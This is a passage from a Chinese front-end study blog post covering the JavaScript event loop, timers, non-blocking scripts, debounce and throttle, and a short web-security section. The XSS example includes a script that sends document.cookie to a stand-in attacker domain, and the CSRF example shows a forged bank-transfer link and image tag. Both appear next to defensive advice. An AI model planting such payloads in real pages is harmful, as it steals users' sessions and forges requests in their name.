+<h3 id="扩展出js单线程问题"><a href="#扩展出js单线程问题" class="headerlink" title="扩展出js单线程问题"></a>扩展出js单线程问题</h3><h4 id="js单线程执行栈、任务队列模型"><a href="#js单线程执行栈、任务队列模型" class="headerlink" title="js单线程执行栈、任务队列模型"></a>js单线程执行栈、任务队列模型</h4><p><strong>javascript是单线程的：</strong><br>JS运行在浏览器中，是单线程的，每个window（页面 || frame || iframe）一个JS线程。</p>
+<blockquote>
+<p>抛一个问题：为什么JavaScript不能有多个线程呢？这样能提高效率啊。</p>
+</blockquote>
+<p>答：<br>与它的用途有关。作为浏览器脚本语言，JavaScript的主要用途是与用户互动，以及操作DOM。<br>比如，假定JavaScript同时有两个线程，一个线程在某个DOM节点上添加内容，另一个线程删除了这个节点，这时浏览器应该以哪个线程为准？<br>所以，为了避免复杂性，从一诞生，JavaScript就是单线程，这已经成了这门语言的核心特征，将来也不会改变。<br>为了利用多核CPU的计算能力，HTML5提出Web Worker标准，允许JavaScript脚本创建多个线程，但是子线程完全受主线程控制，且不得操作DOM。所以，这个新标准并没有改变JavaScript单线程的本质。</p>
+<p>扩展：</p>
+<ol>
+<li>什么是进程，和线程的关系。不做展开。</li>
+<li>js并发模式：并发与并行是有区别的。 前者是逻辑上的同时发生，而后者是物理上的同时发生。所以，单核处理器也能实现并发。</li>
+</ol>
+<p><strong>异步事件驱动：</strong><br>浏览器有一个内部大消息循环，Event Loop（事件循环），会轮询大的事件队列并处理事件。–“浏览器的事件循环”机制</p>
+<p>任务队列：<br>（1）所有同步任务都在javascript主线程上执行，形成一个“执行栈”（execution context stack）。<br>（2）主线程之外，还存在一个”任务队列”（task queue）。只要异步任务有了运行结果，就在”任务队列”之中放置一个事件。<br>（3）一旦”执行栈”中的所有同步任务执行完毕，系统就会读取”任务队列”，看看里面有哪些事件。那些对应的异步任务，于是结束等待状态，进入执行栈，开始执行。<br>（4）主线程不断重复上面的第三步。</p>
+<blockquote>
+<p>运行时主要构成元素：Stack（栈）、Heap（堆）、Queue（队列）</p>
+</blockquote>
+<p>【Stack（栈）】：这里放着JavaScript正在执行的任务。每个任务被称为帧（stack of frames）。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params">b</span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> a = <span class="number">12</span>;</span><br><span class="line">  <span class="keyword">return</span> a+b+<span class="number">35</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">g</span>(<span class="params">x</span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> m = <span class="number">4</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">f</span>(m*x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">g</span>(<span class="number">21</span>);</span><br></pre></td></tr></table></figure>
+<p>上述代码调用 g 时，创建栈的第一帧，该帧包含了 g 的参数和局部变量。当 g 调用 f 时，第二帧就会被创建，并且置于第一帧之上，当然，该帧也包含了 f 的参数和局部变量。当 f 返回时，其对应的帧就会出栈。同理，当 g 返回时，栈就为空了（栈的特定就是后进先出 Last-in first-out (LIFO)）。</p>
+<p>【Heap（堆）】:一个用来表示内存中一大片非结构化区域的名字，对象都被分配在这。</p>
+<p>【Queue（队列）】:<br>一个 JavaScript runtime 包含了一个任务队列，该队列是由一系列待处理的任务组成。而每个任务都有相对应的函数。当栈为空时，就会从任务队列中取出一个任务，并处理之。该处理会调用与该任务相关联的一系列函数（因此会创建一个初始栈帧）。当该任务处理完毕后，栈就会再次为空。（Queue的特点是先进先出 First-in First-out (FIFO)）。</p>
+<blockquote>
+<p>为了方便描述与理解，作出以下约定：</p>
+</blockquote>
+<ul>
+<li>Stack栈为主线程</li>
+<li>Queue队列为任务队列（等待调度到主线程执行）</li>
+</ul>
+<h4 id="浏览器多线程"><a href="#浏览器多线程" class="headerlink" title="浏览器多线程"></a>浏览器多线程</h4><p>例如Webkit或是Gecko引擎，都可能有如下线程：</p>
+<ul>
+<li>javascript引擎线程</li>
+<li>界面渲染线程</li>
+<li>浏览器事件触发线程</li>
+<li>Http请求线程</li>
+</ul>
+<p><strong>问题：</strong>如果js是单线程的，那么谁去轮询大的Event loop事件队列？答案是浏览器会有单独的线程去处理这个队列。</p>
+<p> 浏览器的内核是多线程的，它们在内核制控下相互配合以保持同步，一个浏览器至少实现三个常驻线程：</p>
+<ol>
+<li>JavaScript引擎线程 JavaScript引擎是基于事件驱动单线程执行的，JavaScript 引擎一直等待着任务队列中任务的到来，然后加以处理。</li>
+<li>GUI渲染线程 GUI渲染线程负责渲染浏览器界面，当界面需要重绘（Repaint）或由于某种操作引发回流(reflow)时,该线程就会执行。但需要注意GUI渲染线程与JavaScript引擎是互斥的，当JavaScript引擎执行时GUI线程会被挂起，GUI更新会被保存在一个队列中等到JavaScript引擎空闲时立即被执行。</li>
+<li>浏览器事件触发线程 事件触发线程，当一个事件被触发时该线程会把事件添加到“任务队列”的队尾，等待JavaScript引擎的处理。这些事件可来自JavaScript引擎当前执行的代码块如setTimeOut、也可来自浏览器内核的其他线程如鼠标点击、AJAX异步请求等，但由于JavaScript是单线程执行的，所有这些事件都得排队等待JavaScript引擎处理。</li>
+</ol>
+<h4 id="setInterval-setTimeout"><a href="#setInterval-setTimeout" class="headerlink" title="setInterval setTimeout"></a>setInterval setTimeout</h4><p>定时器:<br>包括setTimeout与setInterval两个方法。它们的第二个参数是指定其回调函数推迟\每隔多少毫秒数后执行。在到达指定时间时，定时器就会将相应回调函数插入“任务队列”尾部。 对于第二个参数有以下需要注意的地方：</p>
+<ul>
+<li>当第二个参数缺省时，默认为0；</li>
+<li>当指定的值小于4毫秒，则增加到4ms（4ms是HTML5标准指定的，对于2010年及之前的浏览器则是10ms）；</li>
+</ul>
+<br/>
+> settimeout, setinerval 区别：
+
+<ul>
+<li>setTimeout方法不会每隔5秒钟就执行一次回掉函数，它是在每次调用setTimeout后过5秒钟再去执行回掉函数。这意味着如果回掉函数的主体部分需要2秒钟执行完，那么整个函数则要每7秒钟才执行一次。</li>
+<li>setInterval却没有被自己所调用的 函数所束缚，它只是简单地每隔一定时间就重复执行一次那个函数。<ul>
+<li>下边代码我们每100毫秒调用一次func函数，如果func的执行时间少于100毫秒的话，在遇到下一个100毫秒前就能够执行完：</li>
+<li>如果func的执行时间大于100毫秒，那么第二个func会在队列（这里的队列是指event loop）中等待，直到第一个函数执行完<br/><strong>有可能会立即执行，中间没有时间间隔</strong></li>
+<li>如果第一个函数的执行时间特别长，只要发现队列中有一个被执行的函数存在，那么其他的统统忽略，如图在第300毫秒和400毫秒处的回调都被抛弃。<br>不过一旦第一个函数执行完后，接着执行队列中的函数，即使这个函数已经“过时”很久了。<br/>如果执行栈中函数在第450毫秒处结束的话会立即执行队列中函数，并在第500毫秒时，它会继续执行下一轮func，<strong>也就是说第一次函数执行结束到第三次函数调用这之间的间隔只有50ms，有效调用时间间隔很大</strong></li>
+<li>上边加黑部分说明，虽然你在setInterval里指定的周期是100ms，但它并不能保证两个函数之间调用的间隔一定是100ms。有可能是间隔100ms执行一次（1的情况），有可能是连续执行（2，3的情况）。</li>
+</ul>
+</li>
+</ul>
+<p>e.g.</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setInterval</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">func</span>(i++);</span><br><span class="line">&#125;, <span class="number">100</span>)</span><br></pre></td></tr></table></figure>
+<p>setTimeout 中的 this 被无数人吐槽过 ,setTimeout 的 this 会指向全局作用域，</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123; </span><br><span class="line">    <span class="attr">a</span>: <span class="string">&quot;a”, </span></span><br><span class="line"><span class="string">    b: function() &#123; </span></span><br><span class="line"><span class="string">        setTimeout(function() &#123; </span></span><br><span class="line"><span class="string">            console.log( this.a ); &#125;, 1000);  </span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"> &#125; </span></span><br><span class="line"><span class="string">o.b(); // undefined</span></span><br></pre></td></tr></table></figure>
+<p>解决办法：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123; </span><br><span class="line">    <span class="attr">a</span>: <span class="string">&quot;a”, </span></span><br><span class="line"><span class="string">    b: function() &#123; </span></span><br><span class="line"><span class="string">        var that = this;</span></span><br><span class="line"><span class="string">        setTimeout(function() &#123; </span></span><br><span class="line"><span class="string">            console.log( that.a ); &#125;, 1000); </span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"> &#125;</span></span><br><span class="line"><span class="string"> o.b(); // &quot;</span>a<span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
+<p><strong>html5 &amp; es6扩展:</strong><br>var requestId &#x3D; requestAnimationFrame(func);<br>cancelAnimationFrame(requestId);<br>    只有一个参数，就是要执行的函数func<br>    html5新的标准，不过大部分的现代浏览器已经实现很好了。<br>    间隔时间是由显示器的刷新频率控制的，不由用户控制， 刷新频率大概为 60次&#x2F;s，大概16.67&#x2F;ms刷新一次，每次刷新就会触发。好处：1、用户不用关心间隔时间。2、动画比前边流畅（不会出现掉帧）</p>
+<p>process.nextTick和setImmediate的一个重要区别：多个process.nextTick语句总是在当前”执行栈”一次执行完，多个setImmediate可能则需要多次loop才能执行完。<br>另外，由于process.nextTick指定的回调函数是在本次”事件循环”触发，而setImmediate指定的是在下次”事件循环”触发，所以很显然，前者总是比后者发生得早，而且执行效率也高（因为不用检查”任务队列”）。<br>（概念：process.nextTick方法可以在当前”执行栈”的尾部—-下一次Event Loop（主线程读取”任务队列”）之前—-触发回调函数。也就是说，它指定的任务总是发生在所有异步任务之前。setImmediate方法则是在当前”任务队列”的尾部添加事件，也就是说，它指定的任务总是在下一次Event Loop时执行，这与setTimeout(fn, 0)很像。）</p>
+<h4 id="非阻塞js实现"><a href="#非阻塞js实现" class="headerlink" title="非阻塞js实现"></a>非阻塞js实现</h4><p>js在浏览器中需要被下载、解释并执行这三步。在html body标签中的script都是阻塞的。也就是说，顺序下载、解释、执行。<br>Chrome可以实现多线程并行下载外部资源，例如：script file、image、frame等（css比较复杂，在IE中不阻塞下载，但Firefox阻塞下载）。<br>但是，由于js是单线程的，所以尽管浏览器可以并发加快js的下载，但必须依次执行。所以chrome中image图片资源是可以并发下载的。</p>
+<p>要实现非阻塞js（non-blocking javascript）有两个方法：</p>
+<ul>
+<li>html5 defer和async关键字:<ul>
+<li>defer：在页面加载完成后才能运行的脚本 — ie10<br/><code> &lt;script type=&quot;text/javascript&quot; defer src=&quot;foo.js&quot;&gt;&lt;/script&gt;</code></li>
+<li>async：脚本将尽快异步运行 — ie10<br/> <code>&lt;script type=&quot;text/javascript&quot; async src=&quot;foo.js&quot;&gt;&lt;/script&gt;</code></li>
+</ul>
+</li>
+<li>动态加载js — js创建script加载，类似AMD中的动态require</li>
+</ul>
+<h1 id="前端优化综述"><a href="#前端优化综述" class="headerlink" title="前端优化综述"></a>前端优化综述</h1><blockquote>
+<p>about优化</p>
+</blockquote>
+<p>到这里我们暂停一下，拿出1分钟，先思考一下web前端的本质是什么。<br>是什么？是什么？是什么？</p>
+<p>我个人觉得是前端的本质就是如何将信息又快又好的展示给用户，方便用户的浏览和交互。</p>
+<p>辣么，如何做？</p>
+<p>上边浏览器输入url后的每一步我都尽可能写了优化的方案，总的来说思路就是：</p>
+<ul>
+<li>合理使用缓存，缩短连接通道建立时间。<ul>
+<li>MD5戳，减少304</li>
+<li>使用CDN，加快资源加载</li>
+</ul>
+</li>
+<li>减少文件大小<ul>
+<li>压缩</li>
+</ul>
+</li>
+<li>减少请求<ul>
+<li>合并</li>
+<li>雪碧图</li>
+</ul>
+</li>
+<li>减少页面回流，提升页面性能<ul>
+<li>css放前，js放后</li>
+<li>模块、图片等懒加载</li>
+<li>减少DOM查询，对DOM查询做缓存</li>
+<li>减少DOM 操作，多个操作尽量合并在一起执行（DocumentFragment）</li>
+<li>尽早执行操作（DOMContentLoaded）</li>
+<li>事件节流</li>
+<li>使用 SSR 后端渲染，数据直接输出到 HTML 中，减少浏览器使用 JS 模板渲染页面 HTML 的时间</li>
+</ul>
+</li>
+<li>增加页面的可读性、可维护性<ul>
+<li>语义化</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>优化详情：<br>注意上边浏览器输入url后请求的过程中每一步都尽可能的介绍了优化方案。总体上除了这些优化的点，最好有专门系统可以根据具体数据进行分析，以不断优化改进。</p>
+</blockquote>
+<p><strong>懒加载：</strong><br>一开始先给为 src 赋值成一个通用的预览图，下拉时候再动态赋值成正式的图片。如下，preview.png是预览图片，比较小，加载很快，而且很多图片都共用这个preview.png，加载一次即可。待页面下拉，图片显示出来时，再去替换src为data-realsrc的值。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;preview.png&quot;</span> data-realsrc=<span class="string">&quot;abc.png&quot;</span>/&gt;</span><br></pre></td></tr></table></figure>
+<p>另外，这里为何要用data-开头的属性值？—— 所有 HTML 中自定义的属性，都应该用data-开头，因为data-开头的属性浏览器渲染的时候会忽略掉，提高渲染性能。</p>
+<p><strong>DOM 查询做缓存:</strong><br>DOM 操作，无论查询还是修改，都是非常耗费性能的，应尽量减少。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var pList = document.getElementsByTagName(&#x27;p&#x27;)  // 只查询一个 DOM ，缓存在 pList 中了</span><br><span class="line">var i</span><br><span class="line">for (i = 0; i &lt; pList.length; i++) &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var i</span><br><span class="line">for (i = 0; i &lt; document.getElementsByTagName(&#x27;p&#x27;).length; i++) &#123;  // 每次循环，都会查询 DOM ，耗费性能</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>合并 DOM 插入:</strong><br>DOM 操作是非常耗费性能的，因此插入多个标签时，先插入 Fragment 然后再统一插入 DOM。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var listNode = document.getElementById(&#x27;list&#x27;)</span><br><span class="line">// 要插入 10 个 li 标签</span><br><span class="line">var frag = document.createDocumentFragment();</span><br><span class="line">var x, li;</span><br><span class="line">for(x = 0; x &lt; 10; x++) &#123;</span><br><span class="line">    li = document.createElement(&quot;li&quot;);</span><br><span class="line">    li.innerHTML = &quot;List item &quot; + x;</span><br><span class="line">    frag.appendChild(li);  // 先放在 frag 中，最后一次性插入到 DOM 结构中。</span><br><span class="line">&#125;</span><br><span class="line">listNode.appendChild(frag);...</span><br></pre></td></tr></table></figure>
+<p><strong>尽早执行操作：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">window.addEventListener(&#x27;load&#x27;, function () &#123;</span><br><span class="line">    // 页面的全部资源加载完才会执行，包括图片、视频等</span><br><span class="line">&#125;)</span><br><span class="line">document.addEventListener(&#x27;DOMContentLoaded&#x27;, function () &#123;</span><br><span class="line">    // DOM 渲染完即可执行，此时图片、视频还可能没有加载完</span><br><span class="line">&#125;)...</span><br></pre></td></tr></table></figure>
+<p><strong>防抖动和节流</strong></p>
+<p>针对一些会频繁触发的事件如scroll、resize，如果正常绑定事件处理函数的话，有可能在很短的时间内多次连续触发事件，十分影响性能。针对这类事件要进行防抖动或者节流处理。</p>
+<p>防抖：无论频繁触发多久，都是在停止触发时delay时间后才执行第一次或者才允许被下次触发执行。防重复提交很有用。</p>
+<p>如下实现：高频触发 immediate &#x3D;&#x3D;&#x3D; true, 第一次点击立即触发函数调用， 最后一次点击后 需过delay时间点击才会再次触发（中间频繁点击无反应）。（可用场景举例：表单提交）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">function debounce(fn, delay, immediate) &#123;</span><br><span class="line">    var timer = null;</span><br><span class="line">    return function() &#123;</span><br><span class="line">        var that = this;</span><br><span class="line">        var args = arguments;</span><br><span class="line">        if(timer)&#123; </span><br><span class="line">            clearTimeout(timer); </span><br><span class="line">        &#125;</span><br><span class="line">        if(immediate)&#123;</span><br><span class="line">        </span><br><span class="line">            // 首次立即响应，后边过了delay时间之后才能响应</span><br><span class="line">            if(timer === null) &#123;</span><br><span class="line">                fn.apply(that, args); // 要指定调用对象，这里是window</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            // 过了delay时间，设置判定条件timer = null; 上边才可以响应</span><br><span class="line">            timer = setTimeout(function() &#123;timer = null;&#125;, delay)</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line"></span><br><span class="line">            // 每次触发都要delay时间之后才响应</span><br><span class="line">            timer = setTimeout(function() &#123;fn.apply(that, args)&#125;, delay)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">var run = debounce(function(name)&#123;console.log(&#x27;执行&#x27;, name);&#125;, 1000, true);</span><br><span class="line">run(&#x27;tys&#x27;);</span><br></pre></td></tr></table></figure>
+
+
+<p>节流：节流函数不管事件触发有多频繁，都会保证在规定时间内一定会执行一次真正的事件处理函数。</p>
+<p>如下实现：开始立即触发函数调用，中间delay间隔触发一次，最后一次触发在间隔节点上同中间，不在则要再过 delay时间后自动触发（可用场景举例：滚动页面无限加载、搜索框输入查询内容）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">function throttle(fn, delay) &#123;</span><br><span class="line">    var timer = null;</span><br><span class="line">    var startTime = Date.now();</span><br><span class="line">    return function() &#123;</span><br><span class="line">        var that = this;</span><br><span class="line">        var args = arguments;    </span><br><span class="line"></span><br><span class="line">        // 首次时立即触发，后边每隔delay触发</span><br><span class="line">        if(timer) &#123; </span><br><span class="line">            clearTimeout(timer); </span><br><span class="line">        &#125;</span><br><span class="line">        if(Date.now() - startTime &gt; delay) &#123;</span><br><span class="line">            fn.apply(this, arguments);</span><br><span class="line">            startTime = Date.now();</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            timer = setTimeout(function() &#123;fn.apply(that, args);&#125;, delay);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">var run = throttle(function(name, wise) &#123;console.log(&#x27;执行&#x27;, name, wise);&#125;, 1000);</span><br><span class="line">run(&#x27;tys&#x27;, &#x27;wise&#x27;)</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="web安全"><a href="#web安全" class="headerlink" title="web安全"></a>web安全</h1><p>本片主要介绍前端主要涉及到的安全问题：</p>
+<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>概念</p>
+<ul>
+<li>全称是跨站脚本攻击（Cross Site Scripting），指攻击者在网页中嵌入恶意脚本程序。</li>
+</ul>
+<p>案列</p>
+<ul>
+<li>比如说我写了一个博客网站，然后攻击者在上面发布了一个文章，内容是这样的 <script>window.open(“<a target="_blank" rel="noopener" href="http://www.gongji.com/?param=%E2%80%9D+document.cookie">www.gongji.com?param=”+document.cookie</a>)</script>,如果我没有对他的内容进行处理，直接存储到数据库，那么下一次当其他用户访问他的这篇文章的时候，服务器从数据库读取后然后响应给客户端，浏览器执行了这段脚本，然后就把该用户的cookie发送到攻击者的服务器了。要知道JS 代码一旦执行，那可就不受控制了，因为它跟网页原有的 JS 有同样的权限。</li>
+</ul>
+<p>被攻击的原因</p>
+<ul>
+<li><strong>用户输入的数据变成了代码</strong>，比如说上面的<code>&lt;script&gt;</code>,应该只是字符串却有了代码的作用。</li>
+</ul>
+<p>预防</p>
+<ul>
+<li><strong>将输入的数据进行转义处理</strong>，比如说讲 &lt; 转义成&amp;lt；<strong>除此之外，还可以通过对 cookie 进行较强的控制，比如对敏感的 cookie 增加http-only限制，让 JS 获取不到 cookie 的内容。</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt; 替换为：&amp;lt;</span><br><span class="line">&gt; 替换为：&amp;gt;</span><br><span class="line">” 替换为：&amp;quot;</span><br><span class="line">‘ 替换为：&amp;#x27;</span><br><span class="line">/ 替换为：&amp;#x2f;</span><br></pre></td></tr></table></figure>
+<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2></li>
+</ul>
+<p>概念</p>
+<ul>
+<li>全称是跨站请求伪造(cross site request forgery),指通过伪装成受信任用户的进行访问，通俗的讲就是说我访问了A网站，然后cookie存在了浏览器，然后我又访问了一个流氓网站，不小心点了流氓网站一个链接（向A发送请求），这个时候流氓网站利用了我的身份对A进行了访问。</li>
+</ul>
+<p>案列</p>
+<ul>
+<li>这个例子可能现实中不会存在，但是攻击的方式是一样的。比如说我登录了A银行网站，然后我又访问了室友给的一个流氓网站，然后点了里面的一个链接 <a target="_blank" rel="noopener" href="http://www.a.com/transfer?account=666&amp;money=10000,%E9%82%A3%E4%B9%88%E8%BF%99%E4%B8%AA%E6%97%B6%E5%80%99%E5%BE%88%E5%8F%AF%E8%83%BD%E6%88%91%E5%B0%B1%E5%90%91%E8%B4%A6%E5%8F%B7%E4%B8%BA666%E7%9A%84%E4%BA%BA%E8%BD%AC%E4%BA%861w%E8%BD%AF%E5%A6%B9%E5%B8%81">http://www.A.com/transfer?account=666&amp;money=10000,那么这个时候很可能我就向账号为666的人转了1w软妹币</a></li>
+<li>注意这个攻击方式不一定是我点了这个链接，也可以是这个网站里面一些资源请求指向了这个转账链接，比如说一个<code>&lt;img src=&quot;http://www.A.com/transfer?account=666&amp;money=10000&quot;&gt;</code></li>
+</ul>
+<p>被攻击的原因</p>
+<ul>
+<li>用户本地存储cookie，攻击者利用用户的cookie进行认证，然后伪造用户发出请求。就是说此时在其他域名的页面中，请求<a target="_blank" rel="noopener" href="http://www.a.com/transfer?account=666&amp;money=10000%EF%BC%8C%E4%BC%9A%E5%B8%A6%E7%9D%80A.com%E7%9A%84">http://www.A.com/transfer?account=666&amp;money=10000，会带着A.com的</a> cookie ，这是发生 CSRF 攻击的理论基础。</li>
+<li>某些页面的删除请求（拼接的json接口）在别的网站的中发起，不带token很容易就可以通过了，带token的可以防止，是因为其他网站跨域很难获取到token，即便token写在页面中。token放在页面中、相应头中、response中都可以只要前端能获取到在请求的时候放在request 头中就可以了</li>
+</ul>
+<p>预防</p>
+<ul>
+<li>之所以被攻击是因为攻击者利用了存储在浏览器用于用户认证的cookie，那么如果我们不用cookie来验证不就可以预防了。所以我们可以采用token（不存储于浏览器）认证。</li>
+<li>通过referer识别，HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。那么这样的话，我们必须登录银行A网站才能进行转账了。</li>
+<li>预防 CSRF 就是加入各个层级的权限验证，例如现在的购物网站，只要涉及现金交易，肯定要输入密码或者指纹才行。除此之外，敏感的接口使用POST请求而不是GET也是很重要的。</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B5%8F%E8%A7%88%E5%99%A8url-js%E5%8D%95%E7%BA%BF%E7%A8%8B-web%E5%AE%89%E5%85%A8-%E7%BC%93%E5%AD%98/" rel="tag"># 浏览器url js单线程 web安全 缓存</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/2018/03/14/%E5%89%8D%E7%AB%AF%E7%9F%A5%E8%AF%86%E4%BD%93%E7%B3%BB%E6%A2%B3%E7%90%86%EF%BC%88%E4%BA%8C-1%EF%BC%89%E2%80%94%E2%80%94-%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86HTML%E3%80%81CSS/" rel="next" title="前端知识体系梳理（二-1）—— 重新认识HTML、CSS">
+      前端知识体系梳理（二-1）—— 重新认识HTML、CSS <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E8%BE%93%E5%85%A5url%E6%8C%89%E5%9B%9E%E8%BD%A6%E5%90%8E%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88"><span class="nav-number">1.</span> <span class="nav-text">浏览器输入url按回车后发生了什么</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#DNS%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90%E8%8E%B7%E5%8F%96IP"><span class="nav-number">1.1.</span> <span class="nav-text">DNS域名解析获取IP</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A7%A3%E6%9E%90%E8%B7%AF%E7%BA%BF"><span class="nav-number">1.1.0.1.</span> <span class="nav-text">解析路线</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BC%98%E5%8C%96"><span class="nav-number">1.1.0.2.</span> <span class="nav-text">优化</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%89%A9%E5%B1%95"><span class="nav-number">1.1.0.3.</span> <span class="nav-text">扩展</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BB%BA%E7%AB%8BTCP%E8%BF%9E%E6%8E%A5"><span class="nav-number">1.2.</span> <span class="nav-text">建立TCP连接</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BC%98%E5%8C%96-1"><span class="nav-number">1.2.0.1.</span> <span 